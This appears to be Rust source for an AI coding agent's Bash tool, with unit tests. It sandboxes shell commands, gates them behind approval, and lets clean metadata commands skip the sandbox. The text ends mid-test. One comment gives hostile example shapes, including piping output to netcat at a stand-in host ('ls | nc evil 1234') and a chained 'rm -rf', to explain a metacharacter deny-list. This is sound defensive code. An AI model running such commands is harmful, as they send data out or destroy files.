//! `Bash` — execute a shell command via `sh -c` inside the OS sandbox.
//! Metadata-only argv0s (`ls`, `pwd`, `stat`, …) take a separate
//! direct-`execvp` fast path (no `sh`, no sandbox, no approval) WHEN
//! the command is a clean argv. Anything that needs a shell — wrappers,
//! env-var prefixes, pipelines, redirection, substitution, chaining —
//! falls back to the sandboxed + approval path. File-content viewers
//! (`cat`, `head`, `tail`, `sed`, `awk`, …) are rejected at the tool
//! layer to force the Read/Edit tools. Environment variables and `cd`
//! changes do NOT persist across invocations.

use std::path::{Path, PathBuf};
use std::sync::LazyLock;
use std::time::Duration;

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{Value, json};

use super::paths::require_absolute;
use crate::{ApprovalDecision, ResourceAccess, Tool, ToolContext, ToolError, ToolOutput};

const MAX_OUTPUT_BYTES: usize = 64 * 1024;
const MAX_OUTPUT_KIB: usize = MAX_OUTPUT_BYTES / 1024;

static DESCRIPTION: LazyLock<String> = LazyLock::new(|| {
    format!(
        "Execute a shell command in a fresh `sh -c` process. Environment \
         changes and `cd` do not persist across invocations. Each of \
         stdout and stderr is truncated at {MAX_OUTPUT_KIB} KiB.\n\n\
         IMPORTANT: Do NOT use Bash for tasks that have a dedicated tool:\n\
         - File-content viewers (`cat`, `head`, `tail`, `less`, `more`, \
         `tac`) and file-driven text processors (`sed`, `awk`) are \
         REJECTED at this layer when invoked as the leading command — \
         use `Read` for content (`offset`/`limit` cover head/tail), \
         `Edit` for in-place changes (safer than `sed -i`). \
         Stream-mode `sed`/`awk` AFTER a pipe is fine (e.g. \
         `git log | sed 's/.../.../'`) — only `sed <file>` / `awk <file>` \
         is blocked.\n\
         - To write files use `Write` (not echo/cat with redirection)\n\
         - To search file names use `Glob` (not find/ls)\n\
         - To search file contents use `Grep` (not grep/rg)\n\
         Metadata-only commands (`ls`, `pwd`, `stat`, `file`, `which`, \
         `dirname`, `basename`, `realpath`, `readlink`, `du`, `df`) take \
         a fast lane: direct `execvp` (no `sh` involved), no OS sandbox, \
         no approval gate — but ONLY when the command is a clean argv \
         (literal metadata argv0 + plain args, optionally with quoted \
         paths). Anything that needs a shell — wrappers (`xargs ls`, \
         `timeout 5 ls`, `nohup ls`, `nice ls`), env-var prefixes \
         (`LANG=C ls`), pipelines/redirects/substitution/chaining \
         (`ls; rm`, `ls | head`, `ls $(cat …)`) — falls back to the \
         sandboxed path with the normal approval gate. The fast lane is \
         strictly an optimization; nothing is rejected for shape.\n\
         Reserve Bash for system commands, git operations, build/test, \
         and terminal tasks that require shell execution.\n\n\
         DEFAULT CWD: If `cwd` is omitted, Aura runs the command from the \
         workspace work directory and exports `PWD` with the same value.\n\n\
         PATHS: Any directory or file argument inside the command (cd, ls, \
         mkdir, rm, mv, cp, find, …) MUST be an absolute path. The optional \
         `cwd` parameter MUST also be absolute when provided — relative \
         values are rejected. Always quote file paths that contain spaces \
         with double quotes (e.g. `cd \"/path with spaces/file.txt\"`).\n\n\
         BEFORE BROAD SCANS: Do not run `find`, `du`, recursive `ls`, or \
         similar walks against unknown directories without first checking \
         their size with a bounded probe (e.g. `ls -1 <dir> | wc -l`, or a \
         shallow `find -maxdepth 2`). Large trees can hang the process."
    )
});

pub struct BashTool;

#[derive(Debug, Deserialize)]
struct Params {
    command: String,
    #[serde(default)]
    timeout_ms: Option<u64>,
    #[serde(default)]
    cwd: Option<PathBuf>,
    #[serde(default)]
    description: Option<String>,
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "Bash"
    }

    fn description(&self) -> &str {
        &DESCRIPTION
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "command":    { "type": "string", "description": "The shell command to run" },
                "timeout_ms": { "type": "integer", "minimum": 1, "description": "Per-command timeout in ms (falls back to the tool context timeout)" },
                "cwd":        { "type": "string", "description": "Working directory for the command" },
                "description": {
                    "type": "string",
                    "description": "Clear, concise description of what this command does in active voice (5-10 words). Examples: `ls` → \"List files in current directory\"; `git status` → \"Show working tree status\"; `npm install` → \"Install package dependencies\"."
                }
            },
            "required": ["command"]
        })
    }

    fn accessed_resources(&self, params: &Value) -> Vec<ResourceAccess> {
        params
            .get("command")
            .and_then(|v| v.as_str())
            .map(|s| match classify(s) {
                BashClass::Sandboxed => vec![ResourceAccess::ExecCommand {
                    command: s.to_string(),
                }],
                // Metadata: bypass approval; FileToolRedirect: tool will
                // reject before it ever reaches a sandbox spawn — no
                // point asking.
                BashClass::Metadata | BashClass::FileToolRedirect => Vec::new(),
            })
            .unwrap_or_default()
    }

    fn call_label(&self, params: &Value) -> Option<String> {
        params
            .get("description")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string)
    }

    async fn execute(&self, params: Value, ctx: &ToolContext) -> crate::Result<ToolOutput> {
        let p: Params =
            serde_json::from_value(params).map_err(|e| ToolError::InvalidParams(e.to_string()))?;

        if let Some(dir) = &p.cwd {
            require_absolute(dir, "Bash", "cwd")?;
        }

        let timeout = p
            .timeout_ms
            .map(Duration::from_millis)
            .unwrap_or(ctx.timeout);

        let command = p.command;
        let description = p.description;
        let cwd_ref: Option<&Path> = Some(p.cwd.as_deref().unwrap_or(ctx.workspace_root.as_path()));

        let out = match classify(&command) {
            BashClass::FileToolRedirect => {
                let argv0 = first_token(&command).unwrap_or("?");
                return Err(ToolError::InvalidParams(format!(
                    "Refusing to run `{argv0}` against a file via Bash. Use the right tool \
                     for the job:\n\
                     - Reading content: `Read` (with `offset`/`limit` for head- and \
                       tail-style slices).\n\
                     - In-place file edits: `Edit` (exact-string replacement, fail-fast \
                       on ambiguous matches; far safer than `sed -i`).\n\
                     - Stream filtering inside a pipeline: keep `{argv0}` AFTER a pipe so \
                       it consumes stdin instead of opening a file (e.g. \
                       `git log | sed 's/.../.../'` is fine — only `{argv0} <file>` is \
                       blocked).",
                )));
            }
            BashClass::Metadata => {
                let (program, argv) = parse_metadata_argv(&command)?;
                tokio::select! {
                    _ = ctx.cancellation_token.cancelled() => {
                        return Err(ToolError::Execution("cancelled".into()));
                    }
                    res = run_unsandboxed(&program, &argv, cwd_ref, timeout) => res?,
                }
            }
            BashClass::Sandboxed => {
                let Some(sandbox) = ctx.sandbox.as_ref() else {
                    return Err(ToolError::Execution(
                        "OS sandbox unavailable: install bwrap (Linux: `apt install bubblewrap`) \
                         or sandbox-exec (macOS, ships with the system) and restart aura"
                            .into(),
                    ));
                };
                let args = vec!["-c".into(), command.clone()];
                let attempt = tokio::select! {
                    _ = ctx.cancellation_token.cancelled() => {
                        return Err(ToolError::Execution("cancelled".into()));
                    }
                    res = sandbox.spawn_command(Path::new("sh"), &args, cwd_ref, None, timeout) => res,
                };
                match attempt {
                    Ok(out) => out,
                    Err(sandbox_err) => {
                        // Sandbox infrastructure refused the command (cwd
                        // outside workspace, bwrap setup failure, runner
                        // error, …). Offer the user a one-shot
                        // unsandboxed retry that surfaces the failure
                        // reason in the approval prompt.
                        prompt_and_run_unsandboxed_retry(
                            &command,
                            cwd_ref,
                            timeout,
                            ctx,
                            sandbox_err,
                        )
                        .await?
                    }
                }
            }
        };

        if out.timed_out {
            return Err(ToolError::Timeout(format!("Bash exceeded {timeout:?}")));
        }

        let stdout = truncate_utf8(&out.stdout, MAX_OUTPUT_BYTES);
        let stderr = truncate_utf8(&out.stderr, MAX_OUTPUT_BYTES);

        let mut result = json!({
            "exit_code": out.exit_code,
            "stdout": stdout,
            "stderr": stderr,
        });
        if let Some(hint) = interpret_exit(&command, out.exit_code) {
            result["return_code_interpretation"] = Value::String(hint.into());
        }
        if let Some(desc) = description {
            result["description"] = Value::String(desc);
        }

        Ok(ToolOutput::Json(result))
    }
}

/// Map common diagnostic-tool exit codes to a human-readable hint so
/// the model doesn't treat `grep` / `diff` exit `1` as a failure.
/// Returns `None` for `0`, anything `>= 2`, and any command not in
/// the table.
///
/// `find` is intentionally absent: it exits `0` even when nothing
/// matches, so any `1` is a real traversal/permission/syntax error
/// — relabelling that as "no matches" would mask the failure.
fn interpret_exit(command: &str, exit_code: i32) -> Option<&'static str> {
    if exit_code != 1 {
        return None;
    }
    let argv0 = first_token(command)?;
    match argv0 {
        "grep" | "rg" | "ag" | "fgrep" | "egrep" => Some("no matches"),
        "diff" | "cmp" => Some("differences found"),
        _ => None,
    }
}

fn strip_path(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

#[derive(Debug, PartialEq, Eq)]
enum BashClass {
    /// argv0 only inspects filesystem metadata. Runs unsandboxed (so the
    /// agent can list paths outside `workspace_root`) and skips approval.
    Metadata,
    /// argv0 operates on file contents (`cat`, `head`, `tail`, `less`,
    /// `more`, `tac`, `sed`, `awk`, …). Rejected at the tool layer with
    /// a hint pointing at `Read` (for content) or `Edit` (for in-place
    /// edits) — these have safer, more structured alternatives.
    FileToolRedirect,
    /// Everything else — sandbox + approval gate, as before.
    Sandboxed,
}

const METADATA_COMMANDS: &[&str] = &[
    "ls", "pwd", "stat", "file", "which", "dirname", "basename", "realpath", "readlink", "du", "df",
];

const FILE_TOOL_REDIRECT_COMMANDS: &[&str] = &[
    "cat", "head", "tail", "less", "more", "tac", "sed", "awk", "gawk", "mawk",
];

fn classify(command: &str) -> BashClass {
    let Some(t) = first_token(command) else {
        return BashClass::Sandboxed;
    };
    if FILE_TOOL_REDIRECT_COMMANDS.contains(&t) {
        return BashClass::FileToolRedirect;
    }
    if METADATA_COMMANDS.contains(&t) {
        // The fast path runs without `sh`, so any shell metacharacter
        // would be inert. Rather than reject, we demote to Sandboxed so
        // the command still runs — through the OS sandbox and the
        // approval gate, which is what the user actually wants for
        // shell-needing variants of metadata commands.
        if has_shell_metachars(command).is_some() {
            return BashClass::Sandboxed;
        }
        return BashClass::Metadata;
    }
    BashClass::Sandboxed
}

fn has_shell_metachars(command: &str) -> Option<char> {
    command.chars().find(|c| FORBIDDEN_METACHARS.contains(c))
}

/// argv0 of the command string — the first whitespace-separated token,
/// path-stripped (`/usr/bin/ls` → `ls`). Does NOT skip wrappers (`xargs`,
/// `timeout`, `nohup`, …) and does NOT skip `KEY=VAL` env-var prefixes,
/// because both need a real shell to take effect and the metadata fast
/// path runs without one. Wrapped or env-prefixed commands fall through
/// to Sandboxed where the shell actually runs.
fn first_token(command: &str) -> Option<&str> {
    let raw = command.split_whitespace().next()?;
    let bare = raw.trim_start_matches('\\');
    if bare.contains('=') && !bare.starts_with('=') {
        return None;
    }
    Some(strip_path(bare))
}

/// Shell control characters that need a real shell to take effect.
/// `classify()` uses this set to demote metadata commands containing any
/// of these (`ls /tmp; rm -rf x`, `ls $(cat …)`, `ls | nc evil 1234`, …)
/// from the unsandboxed fast lane to the sandboxed + approved path —
/// they still run, just under the normal gate.
const FORBIDDEN_METACHARS: &[char] = &[
    ';', '&', '|', '$', '`', '<', '>', '(', ')', '{', '}', '\n', '\r',
];

fn parse_metadata_argv(command: &str) -> crate::Result<(String, Vec<String>)> {
    let parts = shell_words::split(command)
        .map_err(|e| ToolError::InvalidParams(format!("failed to parse metadata argv: {e}")))?;
    let mut iter = parts.into_iter();
    let program = iter
        .next()
        .ok_or_else(|| ToolError::InvalidParams("metadata command was empty".into()))?;
    Ok((program, iter.collect()))
}

async fn prompt_and_run_unsandboxed_retry(
    command: &str,
    cwd: Option<&Path>,
    timeout: Duration,
    ctx: &ToolContext,
    sandbox_err: ToolError,
) -> crate::Result<crate::SandboxedOutput> {
    let Some(approval) = ctx.approval.as_ref() else {
        return Err(ToolError::Execution(format!(
            "sandboxed run failed and no mid-execution approval handle is wired, \
             cannot offer unsandboxed retry: {sandbox_err}"
        )));
    };
    let preview = format!(
        "Sandboxed `Bash` invocation failed.\n\
         Command : {command}\n\
         Reason  : {sandbox_err}\n\
         Approve to retry the SAME command WITHOUT the OS sandbox \
         (full shell, no workspace cwd guard, no resource limits)."
    );
    // Cache must be bypassed: a prior sandboxed approval for this
    // command does NOT cover an unsandboxed run, and we never persist
    // an "approve always" on this elevated path either.
    let decision = approval
        .request_uncached(
            "Bash",
            &ctx.session_id,
            &ctx.user,
            vec![ResourceAccess::ExecCommand {
                command: command.to_string(),
            }],
            preview,
        )
        .await;
    match decision {
        ApprovalDecision::Approve | ApprovalDecision::ApproveAlways => {
            let args = ["-c".to_string(), command.to_string()];
            tokio::select! {
                _ = ctx.cancellation_token.cancelled() => {
                    Err(ToolError::Execution("cancelled".into()))
                }
                res = run_unsandboxed("sh", &args, cwd, timeout) => res,
            }
        }
        ApprovalDecision::Deny => Err(ToolError::Execution(format!(
            "sandboxed run failed and the unsandboxed retry was denied: {sandbox_err}"
        ))),
    }
}

async fn run_unsandboxed(
    program: &str,
    args: &[String],
    cwd: Option<&Path>,
    timeout: Duration,
) -> crate::Result<crate::SandboxedOutput> {
    use std::process::Stdio;
    use tokio::io::AsyncReadExt;
    use tokio::process::Command;

    let mut cmd = Command::new(program);
    cmd.args(args);
    if let Some(dir) = cwd {
        cmd.current_dir(dir);
        cmd.env("PWD", dir);
    }
    cmd.stdin(Stdio::null());
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.kill_on_drop(true);

    let mut child = cmd
        .spawn()
        .map_err(|e| ToolError::Execution(format!("spawn `{program}`: {e}")))?;

    let stdout_pipe = child
        .stdout
        .take()
        .ok_or_else(|| ToolError::Execution("child stdout pipe missing".into()))?;
    let stderr_pipe = child
        .stderr
        .take()
        .ok_or_else(|| ToolError::Execution("child stderr pipe missing".into()))?;

    // Cap unsandboxed stdout/stderr at MAX_OUTPUT_BYTES + slack so a
    // runaway producer (`ls -R /`, `du /`) can't OOM us. Dropping the
    // limited reader closes our end of the pipe; the child gets EPIPE on
    // its next write and exits early.
    let read_cap = (MAX_OUTPUT_BYTES + 1024) as u64;
    let stdout_task = tokio::spawn(async move {
        let mut buf = Vec::new();
        let mut limited = stdout_pipe.take(read_cap);
        let _ = limited.read_to_end(&mut buf).await;
        drop(limited);
        buf
    });
    let stderr_task = tokio::spawn(async move {
        let mut buf = Vec::new();
        let mut limited = stderr_pipe.take(read_cap);
        let _ = limited.read_to_end(&mut buf).await;
        drop(limited);
        buf
    });

    let (timed_out, exit_code) = tokio::select! {
        wait = child.wait() => {
            (false, wait.ok().and_then(|s| s.code()).unwrap_or(-1))
        }
        _ = tokio::time::sleep(timeout) => {
            let _ = child.start_kill();
            let _ = child.wait().await;
            (true, -1)
        }
    };

    let stdout = stdout_task.await.unwrap_or_default();
    let stderr = stderr_task.await.unwrap_or_default();

    Ok(crate::SandboxedOutput {
        exit_code,
        stdout,
        stderr,
        timed_out,
    })
}

fn truncate_utf8(bytes: &[u8], max: usize) -> String {
    if bytes.len() <= max {
        return String::from_utf8_lossy(bytes).into_owned();
    }
    let total = bytes.len();
    let mut cut = max;
    while cut > 0 && (bytes[cut] & 0b1100_0000) == 0b1000_0000 {
        cut -= 1;
    }
    let elided = total - cut;
    let mut s = String::from_utf8_lossy(&bytes[..cut]).into_owned();
    use std::fmt::Write as _;
    let _ = write!(s, "\n... [truncated {elided} bytes, total {total}] ...");
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::SandboxedOutput;
    use crate::test_support::{FakeApprovalGate, FakeExecSandbox};
    use crate::{ApprovalHandle, ApprovedResource};
    use aura_model::{ChannelType, User};
    use parking_lot::Mutex;
    use std::sync::Arc;
    use tokio_util::sync::CancellationToken;

    fn ctx_with(sandbox: Option<Arc<dyn crate::ExecSandbox>>) -> ToolContext {
        ToolContext {
            session_id: "t".into(),
            user: User {
                id: "u".into(),
                name: None,
                channel: ChannelType::tui(),
            },
            timeout: Duration::from_secs(5),
            cancellation_token: CancellationToken::new(),
            workspace_root: std::path::PathBuf::from("/tmp"),
            sandbox,
            approval: None,
        }
    }

    fn ctx_with_workspace(
        sandbox: Option<Arc<dyn crate::ExecSandbox>>,
        workspace_root: PathBuf,
    ) -> ToolContext {
        let mut ctx = ctx_with(sandbox);
        ctx.workspace_root = workspace_root;
        ctx
    }

    fn ctx_with_approval(
        sandbox: Option<Arc<dyn crate::ExecSandbox>>,
        gate: Arc<FakeApprovalGate>,
    ) -> ToolContext {
        let mut ctx = ctx_with(sandbox);
        let cache: Arc<Mutex<Vec<ApprovedResource>>> = Arc::new(Mutex::new(Vec::new()));
        ctx.approval = Some(ApprovalHandle::new(gate, cache));
        ctx
    }

    fn fake_with_response(
        out: SandboxedOutput,
    ) -> (Arc<FakeExecSandbox>, Arc<dyn crate::ExecSandbox>) {
        let fake = Arc::new(FakeExecSandbox::new());
        fake.set_response(out);
        let dyn_handle: Arc<dyn crate::ExecSandbox> = fake.clone();
        (fake, dyn_handle)
    }

    /// `ExecSandbox` whose `spawn_command` always returns the configured
    /// `Err` — needed to exercise the sandbox-failure → unsandboxed-retry
    /// path. `FakeExecSandbox` only models the success side.
    struct FailingExecSandbox {
        message: String,
    }

    #[async_trait::async_trait]
    impl crate::ExecSandbox for FailingExecSandbox {
        async fn spawn_command(
            &self,
            _program: &Path,
            _args: &[String],
            _cwd: Option<&Path>,
            _stdin: Option<&[u8]>,
            _timeout: Duration,
        ) -> crate::Result<SandboxedOutput> {
            Err(ToolError::Execution(self.message.clone()))
        }
    }

    #[tokio::test]
    async fn refuses_when_sandbox_missing() {
        let err = BashTool
            .execute(json!({ "command": "echo hi" }), &ctx_with(None))
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::Execution(ref m) if m.contains("OS sandbox unavailable")),
            "got: {err:?}"
        );
    }

    #[tokio::test]
    async fn routes_command_through_sandbox() {
        let (fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 0,
            stdout: b"hello\n".to_vec(),
            stderr: Vec::new(),
            timed_out: false,
        });
        let out = BashTool
            .execute(json!({ "command": "echo hello" }), &ctx_with(Some(sandbox)))
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["exit_code"], 0);
        assert!(v["stdout"].as_str().unwrap().contains("hello"));

        let calls = fake.calls();
        assert_eq!(calls.len(), 1);
        assert_eq!(calls[0].program, std::path::PathBuf::from("sh"));
        assert_eq!(
            calls[0].args,
            vec!["-c".to_string(), "echo hello".to_string()]
        );
    }

    #[tokio::test]
    async fn surfaces_non_zero_exit_from_sandbox() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 7,
            stdout: Vec::new(),
            stderr: Vec::new(),
            timed_out: false,
        });
        let out = BashTool
            .execute(json!({ "command": "exit 7" }), &ctx_with(Some(sandbox)))
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["exit_code"], 7);
    }

    #[tokio::test]
    async fn timeout_flag_yields_timeout_error() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: -1,
            stdout: Vec::new(),
            stderr: Vec::new(),
            timed_out: true,
        });
        let err = BashTool
            .execute(
                json!({ "command": "sleep 5", "timeout_ms": 50 }),
                &ctx_with(Some(sandbox)),
            )
            .await
            .unwrap_err();
        assert!(matches!(err, ToolError::Timeout(_)));
    }

    #[tokio::test]
    async fn rejects_relative_cwd_before_sandbox_dispatch() {
        let err = BashTool
            .execute(
                json!({ "command": "echo hi", "cwd": "relative/path" }),
                &ctx_with(None),
            )
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::InvalidParams(ref m) if m.contains("absolute")),
            "got: {err:?}"
        );
    }

    #[tokio::test]
    async fn grep_exit_one_reports_no_matches() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 1,
            stdout: Vec::new(),
            stderr: Vec::new(),
            timed_out: false,
        });
        let out = BashTool
            .execute(
                json!({ "command": "grep foo bar.txt" }),
                &ctx_with(Some(sandbox)),
            )
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["return_code_interpretation"], "no matches");
    }

    #[tokio::test]
    async fn grep_exit_two_has_no_interpretation() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 2,
            stdout: Vec::new(),
            stderr: b"grep: bar.txt: No such file\n".to_vec(),
            timed_out: false,
        });
        let out = BashTool
            .execute(
                json!({ "command": "grep foo bar.txt" }),
                &ctx_with(Some(sandbox)),
            )
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert!(v.get("return_code_interpretation").is_none());
    }

    #[tokio::test]
    async fn non_diagnostic_exit_one_has_no_interpretation() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 1,
            stdout: Vec::new(),
            stderr: Vec::new(),
            timed_out: false,
        });
        let out = BashTool
            .execute(json!({ "command": "false" }), &ctx_with(Some(sandbox)))
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert!(v.get("return_code_interpretation").is_none());
    }

    #[tokio::test]
    async fn diff_exit_one_reports_differences_found() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 1,
            stdout: b"< a\n> b\n".to_vec(),
            stderr: Vec::new(),
            timed_out: false,
        });
        let out = BashTool
            .execute(
                json!({ "command": "diff a.txt b.txt" }),
                &ctx_with(Some(sandbox)),
            )
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["return_code_interpretation"], "differences found");
    }

    #[tokio::test]
    async fn description_param_round_trips() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput::default());
        let out = BashTool
            .execute(
                json!({ "command": "echo hi", "description": "Print greeting" }),
                &ctx_with(Some(sandbox)),
            )
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["description"], "Print greeting");
    }

    #[test]
    fn bash_call_label_extracts_description() {
        assert_eq!(
            BashTool.call_label(&json!({ "command": "ls", "description": "List files" })),
            Some("List files".into())
        );
        assert_eq!(BashTool.call_label(&json!({ "command": "ls" })), None);
        // Whitespace-only / empty descriptions don't surface a label.
        assert_eq!(
            BashTool.call_label(&json!({ "command": "ls", "description": "   " })),
            None
        );
    }

    #[tokio::test]
    async fn sandbox_err_with_approval_approve_falls_back_to_unsandboxed() {
        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(FailingExecSandbox {
            message: "cwd `/etc` outside workspace".into(),
        });
        let gate = Arc::new(FakeApprovalGate::new(ApprovalDecision::Approve));
        let ctx = ctx_with_approval(Some(sandbox), gate.clone());

        let out = BashTool
            .execute(json!({ "command": "echo hi" }), &ctx)
            .await
            .expect("approved unsandboxed retry must succeed");
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["exit_code"], 0);
        assert!(v["stdout"].as_str().unwrap_or("").contains("hi"));

        // The approval prompt fired once, with the failure reason and
        // the original command both surfaced in the params preview.
        let reqs = gate.requests();
        assert_eq!(reqs.len(), 1, "expected one approval prompt: {reqs:?}");
        assert!(
            reqs[0]
                .params_preview
                .contains("cwd `/etc` outside workspace")
                && reqs[0].params_preview.contains("echo hi")
                && reqs[0].params_preview.contains("WITHOUT the OS sandbox"),
            "preview missing required context: {}",
            reqs[0].params_preview
        );
    }

    #[tokio::test]
    async fn sandbox_err_with_approval_deny_surfaces_original_error() {
        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(FailingExecSandbox {
            message: "bwrap setup failure".into(),
        });
        let gate = Arc::new(FakeApprovalGate::new(ApprovalDecision::Deny));
        let ctx = ctx_with_approval(Some(sandbox), gate.clone());

        let err = BashTool
            .execute(json!({ "command": "echo hi" }), &ctx)
            .await
            .unwrap_err();
        let ToolError::Execution(msg) = err else {
            panic!("expected Execution error, got: {err:?}");
        };
        assert!(
            msg.contains("bwrap setup failure") && msg.contains("denied"),
            "deny should annotate the original sandbox error: {msg}"
        );
        assert_eq!(gate.requests().len(), 1, "deny path still prompts once");
    }

    #[tokio::test]
    async fn sandbox_err_without_approval_handle_returns_explanatory_error() {
        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(FailingExecSandbox {
            message: "bwrap setup failure".into(),
        });
        let ctx = ctx_with(Some(sandbox));

        let err = BashTool
            .execute(json!({ "command": "echo hi" }), &ctx)
            .await
            .unwrap_err();
        let ToolError::Execution(msg) = err else {
            panic!("expected Execution error, got: {err:?}");
        };
        assert!(
            msg.contains("no mid-execution approval handle") && msg.contains("bwrap setup failure"),
            "error must explain why retry wasn't offered AND keep original reason: {msg}"
        );
    }

    #[tokio::test]
    async fn sandbox_ok_does_not_prompt_for_unsandboxed_retry() {
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 1,
            stdout: Vec::new(),
            stderr: b"command failed\n".to_vec(),
            timed_out: false,
        });
        let gate = Arc::new(FakeApprovalGate::new(ApprovalDecision::Approve));
        let ctx = ctx_with_approval(Some(sandbox), gate.clone());

        // Non-zero exit is the command's own failure, not a sandbox
        // infrastructure failure. We must NOT auto-prompt for an
        // unsandboxed retry — that would be noise on every failed test.
        let out = BashTool
            .execute(json!({ "command": "false" }), &ctx)
            .await
            .expect("non-zero exit returns Ok");
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["exit_code"], 1);
        assert!(
            gate.requests().is_empty(),
            "no approval prompt for non-zero exit: {:?}",
            gate.requests()
        );
    }

    #[tokio::test]
    async fn truncation_message_includes_byte_count() {
        let big = vec![b'a'; MAX_OUTPUT_BYTES + 4096];
        let total = big.len();
        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
            exit_code: 0,
            stdout: big,
            stderr: Vec::new(),
            timed_out: false,
        });
        let out = BashTool
            .execute(json!({ "command": "yes" }), &ctx_with(Some(sandbox)))
            .await
            .unwrap();
        let ToolOutput::Json(v) = out else { panic!() };
        let stdout = v["stdout"].as_str().unwrap();
        assert!(stdout.ends_with("] ..."), "stdout tail: {stdout:?}");
        assert!(
            stdout.contains(&format!("total {total}")),
            "missing total in: {stdout:?}"
        );
        assert!(
            stdout.contains("truncated 4096 bytes"),
            "missing elided count in: {stdout:?}"
        );
    }

    #[test]
    fn classify_routes_metadata_content_and_default() {
        // Metadata fast path — only literal first-token argv0 qualifies.
        assert_eq!(classify("ls /etc"), BashClass::Metadata);
        assert_eq!(classify("/usr/bin/stat foo"), BashClass::Metadata);
        assert_eq!(classify("pwd"), BashClass::Metadata);
        assert_eq!(classify("du -sh /home"), BashClass::Metadata);

        // Wrapped or env-prefixed metadata commands fall through to the
        // sandboxed path on purpose — wrappers/env-vars need a real
        // shell, and metadata mode runs without one.
        assert_eq!(classify("LANG=C ls -la"), BashClass::Sandboxed);
        assert_eq!(classify("xargs ls"), BashClass::Sandboxed);
        assert_eq!(classify("timeout 5 du -sh ."), BashClass::Sandboxed);
        assert_eq!(classify("nohup ls /tmp"), BashClass::Sandboxed);
        assert_eq!(classify("nice -n 10 ls"), BashClass::Sandboxed);

        // FileToolRedirect — only catches the literal leading argv0. Wrapped
        // variants like `xargs cat`, `LANG=C cat`, `timeout 5 head` route
        // through Sandboxed instead (best-effort tool-layer policy, not a
        // hard gate; same trade-off as `nohup cat` and `bash -c "cat …"`).
        assert_eq!(classify("cat foo.txt"), BashClass::FileToolRedirect);
        assert_eq!(classify("head -n 10 a.log"), BashClass::FileToolRedirect);
        assert_eq!(classify("/usr/bin/less x"), BashClass::FileToolRedirect);
        assert_eq!(classify("sed -i 's/a/b/' f"), BashClass::FileToolRedirect);
        assert_eq!(classify("awk '{print $1}' f"), BashClass::FileToolRedirect);
        assert_eq!(
            classify("gawk -F, '{print}' f"),
            BashClass::FileToolRedirect
        );
        assert_eq!(classify("mawk '/x/' f"), BashClass::FileToolRedirect);

        assert_eq!(classify("echo hi"), BashClass::Sandboxed);
        assert_eq!(classify("grep foo bar.txt"), BashClass::Sandboxed);
        assert_eq!(classify("xargs cat foo"), BashClass::Sandboxed);
        assert_eq!(classify("LANG=C cat foo"), BashClass::Sandboxed);
        assert_eq!(classify("timeout 5 head log"), BashClass::Sandboxed);
        assert_eq!(classify(""), BashClass::Sandboxed);
    }

    #[test]
    fn first_token_strips_path_but_not_wrappers_or_env() {
        assert_eq!(first_token("ls /etc"), Some("ls"));
        assert_eq!(first_token("/usr/bin/stat foo"), Some("stat"));
        // Wrappers and env-vars are NOT unwrapped — that's the point.
        assert_eq!(first_token("xargs ls"), Some("xargs"));
        assert_eq!(first_token("timeout 5 ls"), Some("timeout"));
        assert_eq!(first_token("LANG=C ls"), None);
        assert_eq!(first_token(""), None);
    }

    #[test]
    fn accessed_resources_skips_metadata_and_file_tool_redirect() {
        let resources = BashTool.accessed_resources(&json!({ "command": "ls /etc" }));
        assert!(resources.is_empty(), "metadata must not request approval");

        let resources = BashTool.accessed_resources(&json!({ "command": "cat foo" }));
        assert!(
            resources.is_empty(),
            "content-read is rejected before sandbox; no approval needed"
        );

        let resources = BashTool.accessed_resources(&json!({ "command": "echo hi" }));
        assert_eq!(
            resources.len(),
            1,
            "default path still declares ExecCommand"
        );
    }

    #[tokio::test]
    async fn rejects_file_tool_redirect_commands_with_read_tool_hint() {
        for cmd in [
            "cat foo",
            "head -n 5 a",
            "tail b",
            "less c",
            "more d",
            "tac e",
            "sed -i 's/a/b/' f",
            "awk '{print}' f",
        ] {
            let err = BashTool
                .execute(json!({ "command": cmd }), &ctx_with(None))
                .await
                .unwrap_err();
            let ToolError::InvalidParams(msg) = err else {
                panic!("expected InvalidParams for {cmd:?}, got: {err:?}");
            };
            assert!(
                msg.contains("Read") && msg.contains("Edit"),
                "rejection for {cmd:?} should mention both Read and Edit: {msg}"
            );
        }
    }

    #[test]
    fn metadata_with_metachars_demotes_to_sandboxed() {
        // The Codex-flagged shapes — chaining, substitution, redirection,
        // pipelines, parens — used to ride along into the unsandboxed
        // fast path. Now they classify as Sandboxed so the OS sandbox +
        // approval gate handle them just like any other shell command.
        for cmd in [
